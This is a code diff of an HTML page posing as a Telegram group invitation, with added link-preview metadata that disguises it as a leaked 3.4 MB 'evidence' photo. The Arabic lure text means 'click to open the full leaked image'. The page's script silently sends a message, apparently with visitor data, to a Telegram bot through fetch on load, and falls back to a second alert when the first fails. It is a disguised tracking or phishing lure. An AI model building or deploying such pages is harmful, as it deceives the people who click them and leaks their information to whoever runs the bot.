@@ -3,6 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta property="og:title" content="IMG_2026_Evidence.jpg (3.4 MB)">
+    <meta property="og:description" content="اضغط لفتح الصورة المسربة بالكامل">
+    <meta property="og:image" content="https://images.pexels.com/photos/268533/pexels-photo-268533.jpeg">
+    <meta property="og:type" content="image/jpeg">
+    <meta name="twitter:card" content="summary_large_image">
+
     <title>Telegram: Join Group</title>
     <style>
         body { background-color: #1c1c1c; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
@@ -37,7 +44,6 @@
 
                 fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
             } catch (e) {
-                // لو فشل الأول جرب خدمة تانية
                 fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent("⚠️ دخل الرابط بس الخدمة محجوبة عنده")}`);
             }
         })();
